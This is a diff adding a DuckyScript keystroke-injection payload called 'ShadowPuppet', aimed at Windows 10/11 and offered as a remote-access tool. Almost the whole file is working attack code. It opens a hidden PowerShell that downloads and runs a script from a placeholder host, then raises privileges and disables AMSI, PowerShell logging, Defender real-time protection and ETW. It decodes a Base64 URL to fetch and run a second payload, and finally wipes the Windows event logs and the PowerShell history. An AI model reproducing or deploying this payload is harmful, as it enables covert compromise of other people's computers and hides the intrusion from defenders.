@@ -1,0 +1,91 @@
+REM Author: CodeRace
+REM Title: ShadowPuppet
+REM Category: remote-access
+REM Target: Windows 10/11
+
+ATTACKMODE HID
+LED_OFF
+DELAY 500
+
+REM ─── CONFIGURATION ──────────────────────────────────────────────
+DEFINE #EXECUTE_PAYLOAD TRUE
+
+REM Define the URL for the primary PowerShell payload to stream commands.
+REM Always prefix your define names with '#' to ensure correct injection
+REM even when placed next to other characters.
+DEFINE #REMOTE_PS_URL https://yourdomain.com/streamer/stream.ps1
+
+REM Define the Base64-encoded URL for the secondary payload.
+REM As with other defines, include the '#' to guarantee proper injection.
+DEFINE #SECONDARY_B64 aHR0cHM6Ly95b3VyZG9tYWluLmNvbS9wYXlsb2Fkcy9zZWNvbmQucHMx
+
+REM Define the listening port for remote connections.
+DEFINE #LISTEN_PORT 9000
+
+REM ─── PAYLOAD EXECUTION ──────────────────────────────────────────
+IF ( #EXECUTE_PAYLOAD == TRUE ) THEN
+  LED_R
+  DELAY 300
+
+  REM Open Run dialog
+  GUI r
+  DELAY 400
+
+  REM Launch primary PowerShell streamer payload (hidden)
+  STRING powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$lp="
+  STRING #LISTEN_PORT
+  STRINGLN ";$url='"
+  STRINGLN #REMOTE_PS_URL
+  STRINGLN "';iex (iwr $url).Content"
+  ENTER
+
+  DELAY 2000
+
+  REM Request elevated privileges (Admin)
+  CTRL-SHIFT ENTER
+  DELAY 1000
+  ALT y
+  DELAY 500
+
+  REM Launch secondary PowerShell instance
+  GUI r
+  DELAY 300
+  STRINGLN powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass
+  DELAY 300
+
+  REM Disable AMSI (Antimalware Scan Interface)
+  STRINGLN $a='AmsiUtils';$f='amsiInitFailed';[Ref].Assembly.GetType("System.Management.Automation.$a").GetField($f,'NonPublic,Static').SetValue($null,$true)
+  DELAY 100
+
+  REM Disable ScriptBlockLogging and ModuleLogging via registry edits
+  STRINGLN $p='HKLM:\Software\Policies\Microsoft\Windows\PowerShell';New-Item -Path $p -Force|Out-Null;New-ItemProperty -Path "$p\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 0 -PropertyType DWORD -Force|Out-Null;New-ItemProperty -Path "$p\ModuleLogging" -Name EnableModuleLogging -Value 0 -PropertyType DWORD -Force|Out-Null
+  DELAY 100
+
+  REM Disable Windows Defender real-time protection via WMI
+  STRINGLN Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class MSFT_MpPreference | % { $_.DisableRealtimeMonitoring=$true; $_.Put() } | Out-Null
+  DELAY 100
+
+  REM Disable ETW (Event Tracing for Windows) to prevent logging
+  STRINGLN [System.Diagnostics.Eventing.EventProvider]::new([Guid]'{e13c0d23-ccbc-4e12-931b-d9cc2eee27e4}').Dispose()
+  DELAY 100
+
+  REM Inject Base64-encoded secondary payload URL into $b64 variable.
+  REM NOTE: Always prefix the define with '#' here too to avoid
+  REM injection errors when adjacent to other characters.
+  DEFINE #SECONDARY_B64 aHR0cHM6Ly95b3VyZG9tYWluLmNvbS9wYXlsb2Fkcy9zZWNvbmQucHMx
+  STRINGLN $b64="#SECONDARY_B64"
+  DELAY 100
+
+  REM Decode Base64 and execute secondary PowerShell payload
+  STRINGLN $decoded=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64));iex (iwr $decoded).Content
+  DELAY 200
+
+  REM Clear system and PowerShell event logs for cleanup
+  STRINGLN 'Security','System','Application','Windows PowerShell' | % { wevtutil clear-log $_ }
+  DELAY 100
+  STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+  LED_G
+END_IF
+
+LED_OFF
